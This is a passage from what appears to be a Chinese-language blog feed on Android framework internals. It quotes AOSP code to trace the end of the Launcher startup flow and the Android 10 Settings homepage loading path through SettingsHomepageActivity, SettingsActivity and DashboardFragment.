class="variable">clientTransaction</span> <span class="operator">=</span> ClientTransaction.obtain(</span><br><span class="line">                    proc.getThread(), r.appToken);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">final</span> <span class="type">DisplayContent</span> <span class="variable">dc</span> <span class="operator">=</span> r.getDisplay().mDisplayContent;</span><br><span class="line">            <span class="comment">//在回调序列的末尾添加一条消息</span></span><br><span class="line">            clientTransaction.addCallback(LaunchActivityItem.obtain(... ...));</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Set desired final state.</span></span><br><span class="line">            <span class="keyword">final</span> ActivityLifecycleItem lifecycleItem;</span><br><span class="line">            <span class="keyword">if</span> (andResume) &#123;</span><br><span class="line">                lifecycleItem = ResumeActivityItem.obtain(dc.isNextTransitionForward());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                lifecycleItem = PauseActivityItem.obtain();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//添加最后执行的生命周期状态</span></span><br><span class="line">            clientTransaction.setLifecycleStateRequest(lifecycleItem);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 这里其实就是执行ClientTransaction的schedule()方法</span></span><br><span class="line">            mService.getLifecycleManager().scheduleTransaction(clientTransaction);</span><br><span class="line">            ... ...</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (r.launchFailed) &#123;</span><br><span class="line">                <span class="comment">// 第二次启动失败，finish activity并放弃启动</span></span><br><span class="line">                Slog.e(TAG, <span class="string">&quot;Second failure launching &quot;</span></span><br><span class="line">                        + r.intent.getComponent().flattenToShortString() + <span class="string">&quot;, giving up&quot;</span>, e);</span><br><span class="line">                proc.appDied();</span><br><span class="line">                stack.requestFinishActivityLocked(r.appToken, Activity.RESULT_CANCELED, <span class="literal">null</span>,</span><br><span class="line">                        <span class="string">&quot;2nd-crash&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//第一次启动失败，尝试重启进程</span></span><br><span class="line">            r.launchFailed = <span class="literal">true</span>;</span><br><span class="line">            proc.removeActivity(r);</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        endDeferResume();</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityThread调用栈:<br><img src="/images/20231125/20231125004.jpg"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>至此已经走到 realStartActivityLocked，接下来就是 Activity 的启动流程，Activity 启动下篇文章会单独分析。总结一下 Launcher 启动流程，Launcher的启动经过了三个阶段：<br>  1、SystemServer 创建AMS和ATMS，通过 SystemReady 进入 LauncherActivity 的调用<br>  2、Zygote 进程 fork 出 Launcher 进程，通过 Socket 进行通信<br>  3、进入 ActivityThread 的处理，完成 Launcher 的 Acitivty 启动</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 Settings 加载流程</title>
      <link href="/2023/11/19/2023-11-19/"/>
      <url>/2023/11/19/2023-11-19/</url>
      
        <content type="html"><![CDATA[<h3 id="一、系统设置首页"><a href="#一、系统设置首页" class="headerlink" title="一、系统设置首页"></a>一、系统设置首页</h3><p>代码路径：packages/app/Settings/</p><h4 id="1-主界面加载："><a href="#1-主界面加载：" class="headerlink" title="1 主界面加载："></a>1 主界面加载：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Alias <span class="keyword">for</span> launcher activity only, as <span class="built_in">this</span> belongs to each profile. --&gt;</span><br><span class="line">    &lt;activity-alias android:name=<span class="string">&quot;Settings&quot;</span></span><br><span class="line">            android:label=<span class="string">&quot;@string/settings_label_launcher&quot;</span></span><br><span class="line">            android:launchMode=<span class="string">&quot;singleTask&quot;</span></span><br><span class="line">            android:targetActivity=<span class="string">&quot;.homepage.SettingsHomepageActivity&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">            &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">            &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">            &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">        &lt;/intent-filter&gt;</span><br><span class="line">        &lt;meta-data android:name=<span class="string">&quot;android.app.shortcuts&quot;</span> android:resource=<span class="string">&quot;@xml/shortcuts&quot;</span>/&gt;</span><br><span class="line">    &lt;/activity-alias&gt;</span><br></pre></td></tr></table></figure><p>Settings的主界面是Settings.java，但是从Settings.java来看，除了大量的静态类继承SettingsActivity，就无其他有效信息了。但看其xml定义可以发现targetActivity属性，实质应是SettingsHomepageActivity.java。<br>先看其xml配置:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.homepage.SettingsHomepageActivity&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:label</span>=<span class="string">&quot;@string/settings_label_launcher&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Settings.Home&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.settings.SETTINGS&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.settings.PRIMARY_PROFILE_CONTROLLED&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SettingsHomepageActivity.java，主要从onCreate()方法开始:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.settings_homepage_container);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">View</span> <span class="variable">root</span> <span class="operator">=</span> findViewById(R.id.settings_homepage_container);</span><br><span class="line">    root.setSystemUiVisibility(</span><br><span class="line">            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);</span><br><span class="line">    setHomepageContainerPaddingTop();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Toolbar</span> <span class="variable">toolbar</span> <span class="operator">=</span> findViewById(R.id.search_action_bar);</span><br><span class="line">    FeatureFactory.getFactory(<span class="built_in">this</span>).getSearchFeatureProvider()</span><br><span class="line">            .initSearchToolbar(<span class="built_in">this</span> <span class="comment">/* activity */</span>, toolbar, SettingsEnums.SETTINGS_HOMEPAGE);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ImageView</span> <span class="variable">avatarView</span> <span class="operator">=</span> findViewById(R.id.account_avatar);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">AvatarViewMixin</span> <span class="variable">avatarViewMixin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AvatarViewMixin</span>(<span class="built_in">this</span>, avatarView);</span><br><span class="line">    getLifecycle().addObserver(avatarViewMixin);</span><br><span class="line">    <span class="keyword">if</span> (!getSystemService(ActivityManager.class).isLowRamDevice()) &#123;</span><br><span class="line">        <span class="comment">// Only allow contextual feature on high ram devices.</span></span><br><span class="line">        showFragment(<span class="keyword">new</span> <span class="title class_">ContextualCardsFragment</span>(), R.id.contextual_cards_content);</span><br><span class="line">    &#125;</span><br><span class="line">    showFragment(<span class="keyword">new</span> <span class="title class_">TopLevelSettings</span>(), R.id.main_content);</span><br><span class="line">    ((FrameLayout) findViewById(R.id.main_content))</span><br><span class="line">            .getLayoutTransition().enableTransitionType(LayoutTransition.CHANGING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主界面的layout为settings_homepage_container.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">androidx.coordinatorlayout.widget.CoordinatorLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/settings_homepage_container&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fitsSystemWindows</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">androidx.core.widget.NestedScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/main_content_scrollable_container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_behavior</span>=<span class="string">&quot;com.android.settings.widget.FloatingAppBarScrollingViewBehavior&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/homepage_container&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:descendantFocusability</span>=<span class="string">&quot;blocksDescendants&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:id</span>=<span class="string">&quot;@+id/contextual_cards_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;@dimen/contextual_card_side_margin&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginEnd</span>=<span class="string">&quot;@dimen/contextual_card_side_margin&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:id</span>=<span class="string">&quot;@+id/main_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:animateLayoutChanges</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:background</span>=<span class="string">&quot;?android:attr/windowBackground&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">androidx.core.widget.NestedScrollView</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.google.android.material.appbar.AppBarLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/search_bar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.google.android.material.appbar.AppBarLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.coordinatorlayout.widget.CoordinatorLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>主界面布局中主要包含三部分：两个FrameLayout，一个顶部快捷搜索栏。其中Id为main_content的FrameLayout就是用来显示主设置内容的，即Settings的一级菜单项界面。.homepage.SettingsHomepageActivity 中的逻辑并不复杂，直接加载了TopLevelSettings这个Fragment。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showFragment(<span class="keyword">new</span> <span class="title class_">TopLevelSettings</span>(), R.id.main_content);</span><br></pre></td></tr></table></figure><p>TopLevelSettings通过AndroidX的Preference来展示设置项列表，设置项列表的内容通过静态配置+动态添加的方式获取。<br>后面分开分析：SettingsActivity.java、DashboardFragment.java。</p><h4 id="2-SettingsActivity-java"><a href="#2-SettingsActivity-java" class="headerlink" title="2 SettingsActivity.java"></a>2 SettingsActivity.java</h4><p>Settings 继承了 SettingsActivity，有着大量的静态类，但其中并没有实现任何逻辑，那它是怎么加载到自己应有的布局的呢?<br>其实这些Activity的逻辑都是在SettingsActivity中实现。<br>在父类SettingsActivity的onCreate()中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Override</span>  </span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedState)</span> &#123;  </span><br><span class="line">       <span class="built_in">super</span>.onCreate(savedState);  </span><br><span class="line">       <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();  </span><br><span class="line">       <span class="comment">//工厂类实现方法com.android.settings.overlay.FeatureFactoryImpl.java  </span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">FeatureFactory</span> <span class="variable">factory</span> <span class="operator">=</span> FeatureFactory.getFactory(<span class="built_in">this</span>);  </span><br><span class="line">       <span class="comment">//获取菜单信息的工厂类，实现类为DashboardFeatureProviderImpl.java  </span></span><br><span class="line">       mDashboardFeatureProvider = factory.getDashboardFeatureProvider(<span class="built_in">this</span>);  </span><br><span class="line">       mMetricsFeatureProvider = factory.getMetricsFeatureProvider();  </span><br><span class="line"><span class="comment">// 第一步    从intent信息中获取&lt;meta-data/&gt;标签名为&quot;com.android.settings.FRAGMENT_CLASS&quot;的值（下文用于加载Fragment的类名）  </span></span><br><span class="line">       getMetaData();  </span><br><span class="line"><span class="comment">// 第二步</span></span><br><span class="line">     <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">     <span class="keyword">if</span> (intent.hasExtra(EXTRA_UI_OPTIONS)) &#123;</span><br><span class="line">         getWindow().setUiOptions(intent.getIntExtra(EXTRA_UI_OPTIONS, <span class="number">0</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">       <span class="comment">//获取上面getMetaData()得到的类名  </span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">String</span> <span class="variable">initialFragmentName</span> <span class="operator">=</span> intent.getStringExtra(EXTRA_SHOW_FRAGMENT);  </span><br><span class="line">       <span class="comment">//是否为快捷进入方式（如从其它的应用进入Settings的某个设置项）  </span></span><br><span class="line">       mIsShortcut = isShortCutIntent(intent) || isLikeShortCutIntent(intent) ||  </span><br><span class="line">               intent.getBooleanExtra(EXTRA_SHOW_FRAGMENT_AS_SHORTCUT, <span class="literal">false</span>);  </span><br><span class="line">       ... ...  </span><br><span class="line">    </span><br><span class="line">       <span class="keyword">if</span> (savedState != <span class="literal">null</span>) &#123;  </span><br><span class="line">         ... ...  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"><span class="comment">//  第三步   加载布局  </span></span><br><span class="line">           launchSettingFragment(initialFragmentName, isSubSettings, intent);  </span><br><span class="line">       &#125;  </span><br><span class="line"> </span><br><span class="line">       ... ...  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>第一步：<br>首先通过getMetaData()获取该Activity在manifest中配置的fragment, 并赋值给mFragmentClass。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getMetaData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ActivityInfo</span> <span class="variable">ai</span> <span class="operator">=</span> getPackageManager().getActivityInfo(getComponentName(),</span><br><span class="line">                PackageManager.GET_META_DATA);</span><br><span class="line">        <span class="keyword">if</span> (ai == <span class="literal">null</span> || ai.metaData == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        mFragmentClass = ai.metaData.getString(META_DATA_KEY_FRAGMENT_CLASS);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NameNotFoundException nnfe) &#123;</span><br><span class="line">        <span class="comment">// No recovery</span></span><br><span class="line">        Log.d(LOG_TAG, <span class="string">&quot;Cannot get Metadata for: &quot;</span> + getComponentName().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步：<br>通过getIntent()方法、getStartingFragmentClass()方法筛选出要启动的Fragment。<br>第三步：<br>通过launchSettingFragment()启动对应Fragment，这里的initialFragmentName参数就是第二步Intent中包含的EXTRA_SHOW_FRAGMENT参数，mFragmentClass不为空的情况下传入的就是mFragmentClass。</p><h4 id="3-DashboardFragment-java"><a href="#3-DashboardFragment-java" class="headerlink" title="3 DashboardFragment.java"></a>3 DashboardFragment.java</h4><p>通过上面知道，SettingsHomepageActivity 直接加载了TopLevelSettings这个Fragment。而该Fragment继承了DashboardFragment，先来看TopLevelSettings的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TopLevelSettings</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Bundle</span> <span class="variable">args</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">    <span class="comment">// Disable the search icon because this page uses a full search view in actionbar.</span></span><br><span class="line">    args.putBoolean(NEED_SEARCH_ICON_IN_ACTION_BAR, <span class="literal">false</span>);</span><br><span class="line">    setArguments(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到构造方法中仅设置了个标志位，再根据framgments生命周期先来看onAttach()方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAttach</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onAttach(context);</span><br><span class="line">    use(SupportPreferenceController.class).setActivity(getActivity());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用父类DashboardFragment.java的onAttach()方法，此方法主要是完成mPreferenceControllers的加载。<br>接着看onCreate()方法，因为TopLevelSettings未重写父类的方法，所以直接看父类DashboardFragment的onCreate()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle icicle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(icicle);</span><br><span class="line">    <span class="comment">// Set ComparisonCallback so we get better animation when list changes.</span></span><br><span class="line">    getPreferenceManager().setPreferenceComparisonCallback(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PreferenceManager</span>.SimplePreferenceComparisonCallback());</span><br><span class="line">    <span class="keyword">if</span> (icicle != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Upon rotation configuration change we need to update preference states before any</span></span><br><span class="line">        <span class="comment">// editing dialog is recreated (that would happen before onResume is called).</span></span><br><span class="line">        updatePreferenceStates();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据log定位发现，其后调用DashboardFragment.java的onCreatePreferences()方法：这里我也不知道怎么调用到这来的，哈哈。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreatePreferences</span><span class="params">(Bundle savedInstanceState, String rootKey)</span> &#123;</span><br><span class="line">    refreshAllPreferences(getLogTag());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Refresh all preference items, including both static prefs from xml, and dynamic items from</span></span><br><span class="line"><span class="comment"> * DashboardCategory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">refreshAllPreferences</span><span class="params">(<span class="keyword">final</span> String TAG)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">PreferenceScreen</span> <span class="variable">screen</span> <span class="operator">=</span> getPreferenceScreen();</span><br><span class="line">    <span class="comment">// First remove old preferences.</span></span><br><span class="line">    <span class="keyword">if</span> (screen != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Intentionally do not cache PreferenceScreen because it will be recreated later.</span></span><br><span class="line">        screen.removeAll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Add resource based tiles.</span></span><br><span class="line">    displayResourceTiles();</span><br><span class="line">    refreshDashboardTiles(TAG);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Activity</span> <span class="variable">activity</span> <span class="operator">=</span> getActivity();</span><br><span class="line">    <span class="keyword">if</span> (activity != <span class="literal">null</span>) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;All preferences added, reporting fully drawn&quot;</span>);</span><br><span class="line">        activity.reportFullyDrawn();</span><br><span class="line">    &#125;</span><br><span class="line">    updatePreferenceVisibility(mPreferenceControllers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以看到此方法主要是用来加载显示的preference items，主要分为两部分，一个是静态xml定义的prefs(调用displayResourceTiles()方法)，另一部分是从DashboardCategory动态加载(调用refreshDashboardTiles(TAG)方法，其中TAG为 “TopLevelSettings”)。<br>displayResourceTiles()<br>此方法主要是从xml资源文件中加载显示prefs：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Displays resource based tiles.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">displayResourceTiles</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">resId</span> <span class="operator">=</span> getPreferenceScreenResId();</span><br><span class="line">    <span class="keyword">if</span> (resId &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addPreferencesFromResource(resId);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">PreferenceScreen</span> <span class="variable">screen</span> <span class="operator">=</span> getPreferenceScreen();</span><br><span class="line">    screen.setOnExpandButtonClickListener(<span class="built_in">this</span>);</span><br><span class="line">    mPreferenceControllers.values().stream().flatMap(Collection::stream).forEach(</span><br><span class="line">            controller -&gt; controller.displayPreference(screen));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用getPreferenceScreenResId()方法获取所要加载的xml的ID：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span 